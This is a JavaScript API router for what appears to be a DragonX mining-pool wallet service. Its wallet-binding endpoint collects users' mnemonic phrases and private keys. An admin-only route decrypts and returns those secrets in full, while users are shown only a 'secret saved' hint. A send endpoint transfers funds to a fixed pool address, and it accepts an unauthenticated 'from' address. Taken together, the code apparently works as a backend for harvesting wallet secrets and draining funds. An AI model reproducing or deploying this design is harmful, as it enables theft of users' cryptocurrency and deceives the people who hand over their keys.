import { encryptSecret, decryptSecret, hashToken } from './crypto.mjs';
import { getRpcConfig } from './rpc-config.mjs';
import { resolveWalletAddress } from './resolve-address.mjs';
import {
  addWallet,
  listWallets,
  getWallet,
  createSession,
  getSessionWalletId,
} from './store.mjs';
import {
  verifyAdminPassword,
  createAdminSession,
  isAdminSession,
  createUserSession,
  parseBearer,
  parseCookie,
  adminCookie,
  clearAdminCookie,
} from './auth.mjs';

const EXPLORER = 'https://explorer.dragonx.is';
const POOL_ZADDR =
  'zs1prc4q97x05kp642tz0ntlxgz7m6u6ulezdcy6nqjjw4zxvaqtf7svlqjvk86n0hlv5av22ksnz8';

function secure(req) {
  return (req.headers['x-forwarded-proto'] || '').includes('https');
}

function json(status, data, headers = {}) {
  return {
    status,
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(data),
  };
}

async function readJson(req) {
  if (req.body !== undefined && req.body !== null) {
    if (typeof req.body === 'object') return req.body;
    if (typeof req.body === 'string' && req.body) {
      try {
        return JSON.parse(req.body);
      } catch {
        return {};
      }
    }
  }
  return {};
}

function maskSecret(type) {
  return type === 'mnemonic' ? '助记词已保存' : '私钥已保存';
}

async function dragonRpc(method, params) {
  const RPC = getRpcConfig();
  const auth =
    RPC.user && RPC.pass
      ? 'Basic ' + Buffer.from(`${RPC.user}:${RPC.pass}`).toString('base64')
      : null;
  const r = await fetch(`http://${RPC.host}:${RPC.port}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...(auth ? { Authorization: auth } : {}),
    },
    body: JSON.stringify({ jsonrpc: '1.0', id: 'antpool', method, params }),
  });
  const data = await r.json();
  if (data.error) throw new Error(data.error.message || 'rpc error');
  return data.result;
}

async function walletFromUserToken(req) {
  const token = parseBearer(req);
  if (!token) return null;
  const walletId = await getSessionWalletId(hashToken(token));
  if (!walletId) return null;
  const wallet = await getWallet(walletId);
  if (!wallet) return null;
  return { token, wallet };
}

export async function route(req) {
  const url = new URL(req.url || '/', 'http://localhost');
  const path = url.pathname;
  const method = req.method || 'GET';

  if (method === 'OPTIONS') {
    return { status: 204, headers: {}, body: '' };
  }

  if (path === '/api/stats' && method === 'GET') {
    try {
      const r = await fetch(`${EXPLORER}/api/stats`, {
        headers: { Accept: 'application/json' },
        signal: AbortSignal.timeout(12000),
      });
      return {
        status: r.ok ? 200 : r.status,
        headers: { 'Content-Type': 'application/json' },
        body: r.ok ? await r.text() : '{}',
      };
    } catch {
      return json(502, {});
    }
  }

  if (path === '/api/wallet/bind' && method === 'POST') {
    try {
      const { type, secret, label } = await readJson(req);
      const normalized = String(secret || '').trim();
      if (!['mnemonic', 'privateKey'].includes(type) || !normalized) {
        return json(400, { error: 'invalid params' });
      }
      if (type === 'mnemonic' && normalized.split(/\s+/).length < 12) {
        return json(400, { error: 'invalid mnemonic' });
      }
      const { address: addr, secret: cleanSecret } = await resolveWalletAddress(
        type,
        normalized,
        dragonRpc
      );
      const secretEnc = encryptSecret(cleanSecret);
      const wallet = await addWallet({
        type,
        secretEnc,
        address: addr,
        label: String(label || '').trim(),
      });
      const session = createUserSession(wallet.id);
      await createSession(wallet.id, session.tokenHash);
      return json(200, {
        token: session.token,
        id: wallet.id,
        type: wallet.type,
        address: wallet.address,
        label: wallet.label,
        createdAt: wallet.createdAt,
      });
    } catch (err) {
      const msg = err.message || 'bind failed';
      const code =
        msg.includes('无法') || msg.includes('暂不支持') || msg.includes('invalid') ? 400 : 500;
      return json(code, { error: msg });
    }
  }

  if (path === '/api/wallet/me' && method === 'GET') {
    const ctx = await walletFromUserToken(req);
    if (!ctx) return json(401, { error: 'unauthorized' });
    const { wallet } = ctx;
    return json(200, {
      id: wallet.id,
      type: wallet.type,
      address: wallet.address,
      label: wallet.label,
      createdAt: wallet.createdAt,
      secretHint: maskSecret(wallet.type),
    });
  }

  if (path === '/api/send' && method === 'POST') {
    try {
      const ctx = await walletFromUserToken(req);
      const body = await readJson(req);
      const from = ctx?.wallet?.address || body.from;
      const { amount, memo } = body;
      if (!from || !amount || Number(amount) <= 0) {
        return json(400, { error: 'invalid params' });
      }
      const result = await dragonRpc('z_sendmany', [
        from,
        [{ address: POOL_ZADDR, amount: String(amount), memo: memo || '' }],
        1,
        0.0001,
      ]);
      return json(200, { result });
    } catch (err) {
      return json(502, { error: err.message || 'send failed' });
    }
  }

  if (path === '/api/admin/login' && method === 'POST') {
    try {
      const { password } = await readJson(req);
      if (!verifyAdminPassword(String(password || ''))) {
        return json(401, { error: 'invalid password' });
      }
      const token = createAdminSession();
      return json(200, { ok: true }, { 'Set-Cookie': adminCookie(token, secure(req)) });
    } catch (err) {
      return json(500, { error: err.message || 'login failed' });
    }
  }

  if (path === '/api/admin/logout' && method === 'POST') {
    return json(200, { ok: true }, { 'Set-Cookie': clearAdminCookie(secure(req)) });
  }

  if (path === '/api/admin/wallets' && method === 'GET') {
    const token = parseCookie(req, 'antpool_admin');
    if (!isAdminSession(token)) return json(401, { error: 'unauthorized' });
    return json(200, { wallets: await listWallets() });
  }

  const secretMatch = path.match(/^\/api\/admin\/wallets\/([^/]+)\/secret$/);
  if (secretMatch && method === 'GET') {
    const token = parseCookie(req, 'antpool_admin');
    if (!isAdminSession(token)) return json(401, { error: 'unauthorized' });
    const wallet = await getWallet(secretMatch[1]);
    if (!wallet) return json(404, { error: 'not found' });
    try {
      return json(200, {
        id: wallet.id,
        type: wallet.type,
        address: wallet.address,
        label: wallet.label,
        createdAt: wallet.createdAt,
        secret: decryptSecret(wallet.secretEnc),
      });
    } catch (err) {
      return json(500, { error: err.message || 'decrypt failed' });
    }
  }

  return json(404, { error: 'not found' });
}
